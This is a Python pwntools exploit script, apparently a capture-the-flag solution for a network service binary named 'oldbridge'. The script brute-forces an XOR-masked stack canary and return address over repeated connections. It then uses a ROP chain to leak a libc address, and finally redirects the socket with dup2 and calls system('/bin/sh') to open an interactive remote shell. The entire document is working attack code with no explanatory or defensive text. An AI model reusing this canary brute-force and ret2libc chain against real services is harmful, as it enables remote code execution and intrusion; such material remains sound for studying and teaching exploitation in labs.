#!/usr/bin/env python3

from pwn import context, log, p64, p8, remote, sys, u64

context.binary = 'oldbridge'


def get_process():
    with context.local(log_level='CRITICAL'):
        host, port = sys.argv[1].split(':')
        return remote(host, int(port))


def bruteforce_value(payload: bytes, value_name: str, value: bytes = b'') -> bytes:
    value_progress = log.progress(value_name)

    while len(value) < 8:
        for c in range(256):
            value_progress.status(repr(value + p8(c)))

            p = get_process()
            p.sendafter(b'Username: ', payload + value + p8(c))

            try:
                p.recvline()
                value += p8(c)
                break
            except EOFError:
                pass
            finally:
                with context.local(log_level='CRITICAL'):
                    p.close()

    value_progress.success(repr(value))

    return value


def xor(payload: bytes, key: int):
    return bytes([b ^ key for b in payload])


def main():
    offset = 1026
    key = 0xd
    xor_username = b'il{dih'
    username = xor(xor_username, key)
    junk = username + b'A' * offset

    help_canary = xor(b'\0', key)
    help_ret = xor(b'\xcf', key)

    xor_canary = bruteforce_value(junk, 'XOR Canary', value=help_canary)
    xor_saved_rbp = bruteforce_value(junk + xor_canary, 'XOR saved $rbp')
    xor_return_addr = bruteforce_value(junk + xor_canary + xor_saved_rbp, 'XOR return address', value=help_ret)

    canary = u64(xor(xor_canary, key).ljust(8, b'\0'))
    saved_rbp = u64(xor(xor_saved_rbp, key).ljust(8, b'\0'))
    return_addr = u64(xor(xor_return_addr, key).ljust(8, b'\0'))

    log.success(f'Canary: {hex(canary)}')
    log.success(f'Saved $rbp: {hex(saved_rbp)}')
    log.success(f'Return address: {hex(return_addr)}')

    elf_base_addr = return_addr - 0xecf
    log.success(f'ELF base address: {hex(elf_base_addr)}')

    pop_rdi_ret_addr = elf_base_addr + 0xf73 
    pop_rsi_pop_r15_ret_addr = elf_base_addr + 0xf71
    leave_ret_addr = elf_base_addr + 0xb6d

    write_got = elf_base_addr + 0x202020
    write_plt = elf_base_addr + 0x910
    check_username_addr = elf_base_addr + 0xb6f

    socket_fd = 4

    payload  = xor_username
    payload += b'A' * (0x10 - len(xor_username))
    payload += p64(pop_rdi_ret_addr)
    payload += p64(socket_fd)
    payload += p64(pop_rsi_pop_r15_ret_addr)
    payload += p64(write_got)
    payload += p64(0)
    payload += p64(write_plt)
    payload += p64(check_username_addr)
    payload += b'A' * (offset + len(xor_username) - len(payload)) 
    payload += p64(canary)
    payload += p64(saved_rbp - 0x478)
    payload += p64(leave_ret_addr)

    p = get_process()
    p.sendafter(b'Username: ', xor(payload, key))

    write_addr = u64(p.recvuntil(b'Username: ').rstrip(b'Username: ').ljust(8, b'\0'))
    log.success(f'Leaked write() address: {hex(write_addr)}')

    write_offset = 0xf7280  # 0x10e090
    dup2_offset = 0xf7940  # 0x10e8f0
    system_offset = 0x45390  # 0x522c0
    bin_sh_offset = 0x18cd17  # 0x1b45bd

    glibc_base_addr = write_addr - write_offset
    log.success(f'Glibc base address: {hex(glibc_base_addr)}')
    p.close()

    dup2_addr = glibc_base_addr + dup2_offset
    system_addr = glibc_base_addr + system_offset
    bin_sh_addr = glibc_base_addr + bin_sh_offset

    payload  = xor_username
    payload += b'A' * (0x10 - len(xor_username))

    for fd in [0, 1, 2]:
        payload += p64(pop_rdi_ret_addr)
        payload += p64(socket_fd)
        payload += p64(pop_rsi_pop_r15_ret_addr)
        payload += p64(fd)
        payload += p64(0)
        payload += p64(dup2_addr)

    payload += p64(pop_rdi_ret_addr)
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)
    payload += b'A' * (offset + len(xor_username) - len(payload)) 
    payload += p64(canary)
    payload += p64(saved_rbp - 0x478)
    payload += p64(leave_ret_addr)

    p = get_process()
    p.sendafter(b'Username: ', xor(payload, key))
    p.interactive()


if __name__ == '__main__':
    main()
